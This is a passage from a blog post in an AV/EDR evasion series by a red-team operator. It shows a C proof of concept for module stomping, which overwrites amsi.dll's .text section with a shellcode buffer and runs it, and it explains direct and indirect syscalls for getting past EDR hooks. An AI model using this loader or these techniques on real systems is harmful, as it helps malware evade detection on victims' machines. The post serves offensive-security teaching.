the surprise inside is replaced with a confetti cannon (shellcode), and when the time is right, the cannon is remotely activated (thread execution) to create a joyful and memorable celebration.</em></p><p id="b53b" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">This technical explanation adds an extra layer of understanding, illustrating how Module Stomping cleverly leverages DLL injection, overwritten entry points, shellcode, and thread creation to achieve its objectives in a stealthy and creative manner.</em></p></blockquote><p id="18b4" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Let’s see the PoC and I have Implemented it in my tool. Let’s see the code:</p><pre class="nv nw nx ny nz rt ru rv bq rw bc bl"><span id="d640" class="rx or hl ru b bh ry rz m sa sb" data-selectable-paragraph=""><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br></span>{<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *pHollowedDLL;<br> HMODULE hAMSI;<br> DWORD dwOldProtection = <span class="hljs-number">0</span>;<br> <span class="hljs-comment">/* Load amsi.dll to hide payload inside */</span><br> hAMSI = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">"amsi.dll"</span>);<br> PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hAMSI;<br> PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosHeader + pDosHeader-&gt;e_lfanew);<br> PIMAGE_SECTION_HEADER pSection;<br> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br> <span class="hljs-comment">// try to find .text section</span><br> <span class="hljs-keyword">do</span><br> {<br>  pSection = (PIMAGE_SECTION_HEADER)((DWORD_PTR)<span class="hljs-built_in">IMAGE_FIRST_SECTION</span>(pNtHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * index++));<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"sec name %s\n"</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)pSection-&gt;Name);<br> } <span class="hljs-keyword">while</span> (<span class="hljs-built_in">strncmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)pSection-&gt;Name, <span class="hljs-string">".text"</span>, <span class="hljs-number">5</span>) != <span class="hljs-number">0</span>);<br> <br> <span class="hljs-comment">// Now we find .text section, resolve its address</span><br> pHollowedDLL = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)((DWORD_PTR)pDosHeader + pSection-&gt;VirtualAddress);<br> <br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"amsi.dll .text address = 0x%p, see in debugger or processhacker\n"</span>, pHollowedDLL);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hit Enter:"</span>);<br> <span class="hljs-built_in">getchar</span>();<br> <span class="hljs-comment">/* the .text section doesn't have Write permission, so we changes protection to RW and later before exection we will restore again to RX */</span><br> <span class="hljs-built_in">VirtualProtect</span>(pHollowedDLL, <span class="hljs-number">4096</span>, PAGE_READWRITE, &amp;dwOldProtection);<br> <span class="hljs-comment">/* Now we have to move the payload to the hollowed memory */</span><br> <span class="hljs-built_in">RtlMoveMemory</span>(pHollowedDLL, buf, <span class="hljs-built_in">sizeof</span>(buf));<br> <span class="hljs-comment">/*<br>    Now you can decrypt you payload here<br> */</span><br> <span class="hljs-comment">/* Restore RX permission again */</span><br> <span class="hljs-built_in">VirtualProtect</span>(pHollowedDLL, <span class="hljs-number">4096</span>, dwOldProtection, &amp;dwOldProtection);<br> ((<span class="hljs-built_in">void</span> (*)()) pHollowedDLL)();<br><br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}</span></pre><p id="0aa0" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Let’s explain but the code is explain him self but let me explain how we can get the amsi.dll base address:</p><figure class="nv nw nx ny nz oa ns nt paragraph-image"><div role="button" tabindex="0" class="ob oc fr od bi oe"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="ns nt sd"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*vfKhMpPjMWJv6K65QUhmZQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*vfKhMpPjMWJv6K65QUhmZQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*vfKhMpPjMWJv6K65QUhmZQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*vfKhMpPjMWJv6K65QUhmZQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*vfKhMpPjMWJv6K65QUhmZQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*vfKhMpPjMWJv6K65QUhmZQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vfKhMpPjMWJv6K65QUhmZQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*vfKhMpPjMWJv6K65QUhmZQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*vfKhMpPjMWJv6K65QUhmZQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*vfKhMpPjMWJv6K65QUhmZQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*vfKhMpPjMWJv6K65QUhmZQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*vfKhMpPjMWJv6K65QUhmZQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*vfKhMpPjMWJv6K65QUhmZQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*vfKhMpPjMWJv6K65QUhmZQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb of c" width="700" height="434" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*vfKhMpPjMWJv6K65QUhmZQ.png"></picture></div></div></figure><p id="5d32" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">We can see here the virtual address is 1000 so we can do it directly without parse the DLL with easy one line code ^_^</p><pre class="nv nw nx ny nz rt ru rv bq rw bc bl"><span id="7877" class="rx or hl ru b bh ry rz m sa sb" data-selectable-paragraph="">pHollowedDLL = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)((DWORD_PTR)hAMSI + <span class="hljs-number">0x1000</span>);</span></pre><p id="cf56" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">The pHollowedDLL is the pointer that also use as the shellcode in the execution…</p></div></div></div><div class="ac ci po pp pq pr" role="separator"><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="4a74" class="pw or hl bg os px py pz ov qa qb qc oy qd qe qf qg qh qi qj qk ql qm qn qo qp bl" data-selectable-paragraph="">Direct &amp; In Direct Syscalls in Evasion.</h2><p id="2a8e" class="pw-post-body-paragraph mu mv hl mw b mx pj mz na nb pk nd ne nf pl nh ni nj pm nl nm nn pn np nq nr he bl" data-selectable-paragraph="">A <strong class="mw hm">system call (syscall)</strong> is the way a normal program asks the Windows kernel to do something privileged, like allocating memory, reading a file, or creating a thread. Most applications do not “syscall” directly. They call familiar Win32 APIs, which eventually reach <strong class="mw hm">native functions in </strong><code class="de se sf sg ru b"><strong class="mw hm">ntdll.dll</strong></code> (often named <code class="de se sf sg ru b">Nt*</code>), and those functions contain the tiny stub that transitions from user mode into the kernel</p><p id="6af9" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Security tools often watch or hook common user mode entry points (Win32 and <code class="de se sf sg ru b">ntdll</code>) to observe suspicious behavior. That is where “direct” and “indirect” syscall techniques show up in evasion discussions.</p><ul class=""><li id="6e13" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr sc qr qs bl" data-selectable-paragraph=""><strong class="mw hm">Direct syscalls:</strong> instead of calling the exported <code class="de se sf sg ru b">ntdll</code> function, the program uses its own minimal stub to enter the kernel. The usual goal is to avoid user mode hooks placed on the standard API functions.</li><li id="2b06" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph=""><strong class="mw hm">Indirect syscalls:</strong> the program still avoids calling the hooked export, but it arranges for the actual syscall instruction to execute from a “normal looking” location (commonly inside <code class="de se sf sg ru b">ntdll</code>). This can reduce detections that look for syscalls coming from unusual memory regions.</li></ul><p id="b06e" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">These techniques mostly change <strong class="mw hm">how the request is made in user mode</strong>, not what the kernel ends up doing. Strong monitoring can still catch the behavior through other signals, and Windows internals (like syscall numbering) can vary across versions which makes naive implementations brittle. <a class="ah op" href="https://malwaretech.com/2023/12/an-introduction-to-bypassing-user-mode-edr-hooks.html?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">malwaretech.com+1</a></p><p id="c89d" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">We do not have reall y much time and this is not the main focus so here are some great resources to learn more about syscalls!</p><ul class=""><li id="4cc0" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr sc qr qs bl" data-selectable-paragraph=""><a class="ah op" href="https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">Direct Syscalls: A journey from high to low</a> <a class="ah op" href="https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">RedOps</a></li><li id="433d" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph=""><a class="ah op" href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">Direct Syscalls vs Indirect Syscalls</a> <a class="ah op" href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">RedOps</a></li><li id="3d51" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph=""><a class="ah op" href="https://redops.at/en/blog/indirect-syscalls-and-hooked-ssns?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">Indirect Syscalls and Hooked SSNs</a> <a class="ah op" href="https://redops.at/en/blog/indirect-syscalls-and-hooked-ssns?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">RedOps</a></li><li id="8652" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph=""><a class="ah op" href="https://malwaretech.com/2023/12/an-introduction-to-bypassing-user-mode-edr-hooks.html?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">An Introduction to Bypassing User Mode EDR Hooks</a> <a class="ah op" href="https://malwaretech.com/2023/12/an-introduction-to-bypassing-user-mode-edr-hooks.html?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">malwaretech.com</a></li><li id="0938" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph=""><a class="ah op" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/libraries-and-headers?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">Microsoft: user mode calls in Ntdll.dll convert to system calls</a> <a class="ah op" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/libraries-and-headers?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">Microsoft Lear</a>n</li><li id="5f3f" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph=""><a class="ah op" href="https://github.com/jthuraisamy/SysWhispers2?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">SysWhispers2 (reference implementation/tooling)</a> <a class="ah op" href="https://github.com/jthuraisamy/SysWhispers2?utm_source=chatgpt.com" rel="noopener ugc nofollow" target="_blank">GitHub</a></li></ul><figure class="nv nw nx ny nz oa ns nt paragraph-image"><div class="ns nt sh"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*c2NG0I6M2HxZrQIF.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*c2NG0I6M2HxZrQIF.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*c2NG0I6M2HxZrQIF.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*c2NG0I6M2HxZrQIF.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*c2NG0I6M2HxZrQIF.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*c2NG0I6M2HxZrQIF.png 1100w, https://miro.medium.com/v2/resize:fit:1302/format:webp/0*c2NG0I6M2HxZrQIF.png 1302w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 651px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*c2NG0I6M2HxZrQIF.png 640w, https://miro.medium.com/v2/resize:fit:720/0*c2NG0I6M2HxZrQIF.png 720w, https://miro.medium.com/v2/resize:fit:750/0*c2NG0I6M2HxZrQIF.png 750w, https://miro.medium.com/v2/resize:fit:786/0*c2NG0I6M2HxZrQIF.png 786w, https://miro.medium.com/v2/resize:fit:828/0*c2NG0I6M2HxZrQIF.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*c2NG0I6M2HxZrQIF.png 1100w, https://miro.medium.com/v2/resize:fit:1302/0*c2NG0I6M2HxZrQIF.png 1302w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 651px"><img alt="" class="bi mb of c" width="651" height="736" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:651/0*c2NG0I6M2HxZrQIF.png"></picture></div></figure><p id="a2ba" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">The article now is too long so I will recommend to you the best article I have been seen for that: <a class="ah op" href="https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low" rel="noopener ugc nofollow" target="_blank">https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low</a></p><p id="f0a3" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">But i have been talked about some basics for that in the first.</p></div></div></div><div class="ac ci po pp pq pr" role="separator"><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="8d7e" class="pw or hl bg os px py pz ov qa qb qc oy qd qe qf qg qh qi qj qk ql qm qn qo qp bl" data-selectable-paragraph="">Some resources will help you to learn more.</h2><p id="4d1a" class="pw-post-body-paragraph mu mv hl mw b mx pj mz na nb pk nd ne nf pl nh ni nj pm nl nm nn pn np nq nr he bl" data-selectable-paragraph="">coconelonc: <a class="ah op" href="https://cocomelonc.github.io/" rel="noopener ugc nofollow" target="_blank">https://cocomelonc.github.io/</a><br>0xpat : <a class="ah op" href="https://0xpat.github.io/" rel="noopener ugc nofollow" target="_blank">https://0xpat.github.io/</a><br>ired team: https://ired.team<br>Stephen fewer: <a class="ah op" href="https://twitter.com/stephenfewer" rel="noopener ugc nofollow" target="_blank">https://twitter.com/stephenfewer</a><br>sektor7: <a class="ah op" href="https://sektor7.net/" rel="noopener ugc nofollow" target="_blank">https://sektor7.net</a><br>De3vil: <a class="ah op" href="https://github.com/De3vil" rel="noopener ugc nofollow" target="_blank">https://github.com/De3vil</a><br>Abdallah: <a class="ah op" href="https://github.com/abdallah-elsharif" rel="noopener ugc nofollow" target="_blank">https://github.com/</a>0xNinjaCyclone<br>improsec: <a class="ah op" href="https://improsec.com/" rel="noopener ugc nofollow" target="_blank">https://improsec.com/</a><br>and finally the best forum: <a class="ah op" href="https://0x00sec.org/" rel="noopener ugc nofollow" target="_blank">https://0x00sec.org/</a></p><p id="9ea9" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">and really there are more amazing people repos installing tools and cool things7evasion and malware development…</p></div></div></div><div class="ac ci po pp pq pr" role="separator"><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="dce9" class="pw or hl bg os px py pz ov qa qb qc oy qd qe qf qg qh qi qj qk ql qm qn qo qp bl" data-selectable-paragraph="">Contact Me:</h2><p id="8036" class="pw-post-body-paragraph mu mv hl mw b mx pj mz na nb pk nd ne nf pl nh ni nj pm nl nm nn pn np nq nr he bl" data-selectable-paragraph="">Facebook: <a class="ah op" href="https://facebook.com/0xHossam" rel="noopener ugc nofollow" target="_blank">https://facebook.com/0xHossam</a><br>Github: <a class="ah op" href="https://github.com/0xHossam-" rel="noopener ugc nofollow" target="_blank">https://github.com/0xHossam</a></p></div></div></div><div class="ac ci po pp pq pr" role="separator"><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="4bba" class="pw or hl bg os px py pz ov qa qb qc oy qd qe qf qg qh qi qj qk ql qm qn qo qp bl" data-selectable-paragraph="">If you are here so thanks for your reading and I hope you are fine ^_^.</h2></div></div></div></div></section></div></div></article></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="si sj ac ji"><div class="sk ac"><a class="sl ak ao aq" rel="noopener follow" href="https://medium.com/tag/edr-evasion?source=post_page-----162662bb630e---------------------------------------" data-discover="true"><div class="sm fr de sn gv so sp bg b bh ab bl gc">Edr Evasion</div></a></div><div class="sk ac"><a class="sl ak ao aq" rel="noopener follow" href="https://medium.com/tag/av-evasion?source=post_page-----162662bb630e---------------------------------------" data-discover="true"><div class="sm fr de sn gv so sp bg b bh ab bl gc">Av Evasion</div></a></div><div class="sk ac"><a class="sl ak ao aq" rel="noopener follow" href="https://medium.com/tag/malware-development?source=post_page-----162662bb630e---------------------------------------" data-discover="true"><div class="sm fr de sn gv so sp bg b bh ab bl gc">Malware Development</div></a></div><div class="sk ac"><a class="sl ak ao aq" rel="noopener follow" href="https://medium.com/tag/hacking?source=post_page-----162662bb630e---------------------------------------" data-discover="true"><div class="sm fr de sn gv so sp bg b bh ab bl gc">Hacking</div></a></div><div class="sk ac"><a class="sl ak ao aq" rel="noopener follow" href="https://medium.com/tag/red-teaming?source=post_page-----162662bb630e---------------------------------------" data-discover="true"><div class="sm fr de sn gv so sp bg b bh ab bl gc">Red Teaming</div></a></div></div></div></div><div class="m"></div><div class="te m"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac iv it ir tf tg"><div class="th ti tj tk tl tm tn to tp tq ac cw"><div class="i l"><a tabindex="0" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---post_author_info--162662bb630e---------------------------------------" data-discover="true"><div class="m fr"><img alt="Hossam Ehab" class="m fk by tr ts de" width="48" height="48" loading="lazy" src="https://miro.medium.com/v2/resize:fill:48:48/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m tr ts fw o ak tt"></div></div></a></div><div class="k j e"><a tabindex="0" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---post_author_info--162662bb630e---------------------------------------" data-discover="true"><div class="m fr"><img alt="Hossam Ehab" class="m fk by tu tv de" width="64" height="64" loading="lazy" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m tu tv fw o ak tt"></div></div></a></div><div class="k j e tw cb"><div class="ac"></div></div></div><div class="ac cv cd"><div class="tx ty tz ua ub m"><a class="ah ai aj al am an ao ap aq ar as at au av ac r" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---post_author_info--162662bb630e---------------------------------------" data-discover="true"><h2 class="pw-author-name bg ud ue uf ug uh ui uj nf pa pb nj pd pe nn pg ph bl"><span class="he uc">Written by Hossam Ehab</span></h2></a><div class="sk ac ix"><div class="m cb"><span class="pw-follower-count bg b bh ab eb"><a class="ah ai aj fo al am an ao ap aq ar as at jg" rel="noopener follow" href="https://medium.com/@0xHossam/followers?source=post_page---post_author_info--162662bb630e---------------------------------------" data-discover="true">638 followers</a></span></div><div class="bg b bh ab eb ac uk"><span class="ul m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span><a class="ah ai aj fo al am an ao ap aq ar as at jg" rel="noopener follow" href="https://medium.com/@0xHossam/following?source=post_page---post_author_info--162662bb630e---------------------------------------" data-discover="true">101 following</a></div></div><div class="um m"><p class="bg b bh ab bl">Red Team Operator @ Cyshield. LinkedIn -&gt;<a class="ah ai aj fo al am an ao ap aq ar as at op hf he" href="http://linkedin.com/in/0xHossam" rel="noopener  ugc nofollow">linkedin.com/in/0xHossam</a> | interested in malware &amp; windows security research | <a class="ah ai aj fo al am an ao ap aq ar as at op hf he" href="http://x.com/0xHossam" rel="noopener  ugc nofollow">x.com/0xHossam</a></p></div></div></div><div class="i l"><div class="ac"></div></div></div></div></div></div><div class="un uo up uq ur m"><div class="us bi s te"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac r cw"><h2 class="bg ud px pz ov qa qc oy qd qf qg qh qj qk ql qn qo bl">Responses (1)</h2><div class="ac ut"><div><div class="bn" aria-describedby="15" aria-labelledby="15" role="tooltip"><div tabindex="-1" class="bf"><a class="uu uv" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--162662bb630e---------------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" aria-label="Shield with a checkmark" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div></div><div class="uw ux uy uz va vb vc m"><div><div class="bg b bh ab bl"><div class="yr"><div class="yz m"><div class="za ac r"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak tt"></div></div><div class="bo ac cu cv ci"><p class="bg b bh ab eb">Write a response</p></div></div><div class="de bq ac cv ys yt"><div class="ac cv fr"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p-4-162662bb630e&amp;source=---post_responses--162662bb630e---------------------respond_sidebar------------------" data-discover="true"><div class="wv m"><p class="bg b bh ab eb">What are your thoughts?</p></div></a></span><div class="cw yu eb ac yv xv yw"><span class="bg b bh ab eb"><div class="ac"><div><div class="bn" aria-describedby="28" aria-labelledby="28" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Bold (⌘B)" class="zb zc zd ze bq lv ci zf zg zh" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M10.308 17.993h-5.92l.11-.894.783-.12c.56-.11.79-.224.79-.448V5.37c0-.225-.113-.336-.902-.448H4.5l-.114-.894h6.255c4.02 0 5.58 1.23 5.58 3.13 0 1.896-1.78 3.125-3.79 3.463v.11c2.69.34 4.25 1.56 4.25 3.57 0 2.35-2.01 3.69-6.37 3.69l.02.01h-.02zm-.335-12.96H8.967V10.5h1.23c1.788 0 2.79-1.23 2.79-2.683 0-1.685-1.004-2.803-3.006-2.803v.02zm-.223 6.36h-.783v5.588l1.225.23h.22c1.67 0 3.01-1.004 3.01-2.792 0-2.122-1.566-3.016-3.69-3.016h.018z"></path></svg></span></div></div></div><div><div class="bn" aria-describedby="29" aria-labelledby="29" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Italic (⌘I)" class="zb zc zd ze bq lv ci zf zg zh" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M9.847 18.04c-.533 0-2.027-.64-1.92-.853l2.027-7.68-.64-.214-1.387 1.494-.427-.427c.534-1.173 1.707-2.667 2.774-2.667.533 0 2.24.534 2.133.854l-2.133 7.786.533.214 1.6-1.067.427.427c-.64 1.066-1.92 2.133-2.987 2.133m2.347-11.733c-.96 0-1.387-.64-1.387-1.387 0-1.067.747-1.92 1.493-1.92.854 0 1.387.64 1.387 1.493-.107 1.067-.747 1.814-1.493 1.814"></path></svg></span></div></div></div></div></span><div class="yx tw ac yv xv yw"><div class="yy"><button class="bg b ec ab bl zi vd ve vf lu lr vg fc fd fe vh vi vj fh fi fj fk bn fl fm" data-testid="CancelResponseButton">Cancel</button></div><button class="bg b ec ab xi zi xj xk xl xm vg fc fd xn xo xp fh fi fj fk bn fl fm" disabled="" data-testid="ResponseRespondButton">Respond</button></div></div></div></div></div></div></div></div></div><div class="ux m"><div class="bi ed"><div class="zj zk m"><div class="ac cw"><div class="ac r"><div><div class="bn" aria-describedby="68" aria-labelledby="68" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@babipo9745?source=post_page---post_responses--162662bb630e----0-----------------------------------" data-discover="true"><div class="m fr"><div class="m fr"><img alt="Jack Simon" class="m fk by bz ca de" width="32" height="32" loading="lazy" src="https://miro.medium.com/v2/resize:fill:32:32/1*u_GVLkJFB3IiPClkYBr27Q.png"><div class="gj by m bz ca fw o ak gk"></div></div></div></a></div></div></div><div class="zl m"><div class="ac r"><div><div class="bn" aria-describedby="69" aria-labelledby="69" 